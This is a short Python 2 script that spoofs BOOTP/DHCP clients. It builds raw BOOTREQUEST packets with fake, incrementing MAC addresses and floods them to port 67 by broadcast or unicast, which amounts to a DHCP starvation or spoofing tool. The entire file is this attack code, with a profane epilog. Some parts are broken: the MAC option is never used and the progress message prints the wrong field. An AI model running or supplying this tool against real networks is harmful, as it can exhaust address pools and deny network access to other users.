import socket, argparse
from os import urandom

parser = argparse.ArgumentParser(description='Spoof BOOTP clients and send BOOTREQUESTS', epilog=" 'Cause, Fuck You! That's why.")

parser.add_argument('-m', '--mac', help='Enter desired [starting] source MAC Address')
parser.add_argument('-u', '--unicast', help='Send BOOTREQUEST via Unicast to specified IP address')
parser.add_argument('-r', '--repeat', type=int, help='number of BOOTREQUESTS to send, will increment MAC each time')

args = parser.parse_args()

if args.unicast is None:
	UDP_IP = "255.255.255.255"
else:
	UDP_IP = args.unicast
# UDP_IP = "1.1.1.1"
UDP_PORT = 67

#BOOTP FIELDS PER RFC 951: http://tools.ietf.org/html/rfc951
op = bytearray('\x01')			#1 byte, 1=BOOTREQUEST, 2=BOOTREPLY
htype = bytearray('\x01')			#1 byte, hardware address type
hlen = bytearray('\x06')			#1 byte, hardware address length
hops = bytearray('\x00')			#1 byte, client always sets to zero
xid = urandom(4)		#4 bytes, transaction ID
secs = bytearray('\x00\x45')		#2 bytes, seconds since boot
pad1 = bytearray('\x80\x00')		#2 bytes, first bit sets broadcast flag
ciaddr = bytearray('\x00') * 4	#4 bytes, client IP address if known in BOOTREQUEST
yiaddr = bytearray('\x00') * 4	#4 bytes, client IP provided in BOOTREPLY
siaddr = bytearray('\x00') * 4	#4 bytes, server IP provided in BOOTREPLY
giaddr = bytearray('\x00') * 4	#4 bytes, gateway IP for optional cross-gateway booting
chaddr = bytearray('\x00\xDE\xAD\xBE\xEF\x00') + (bytearray('\x00') * 10)	#16 bytes, client hardware address 
sname = bytearray('\x00') * 64	#64 bytes, optional server host name
bfile = bytearray('\x00') * 128	#128 bytes, boot file name
vend = bytearray('\x00') * 64		#64 bytes, optional vendor-specific area

DATA = op+htype+hlen+hops+xid+secs+pad1+ciaddr+yiaddr+siaddr+giaddr+chaddr+sname+bfile+vend

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
# sock.sendto(DATA, (UDP_IP, UDP_PORT))
# print "sent"

for i in range(0,args.repeat):
	chaddr[5] = i
	DATA = op+htype+hlen+hops+xid+secs+pad1+ciaddr+yiaddr+siaddr+giaddr+chaddr+sname+bfile+vend
	sock.sendto(DATA, (UDP_IP, UDP_PORT))
	print "bootp request send as: ",ciaddr

print "done"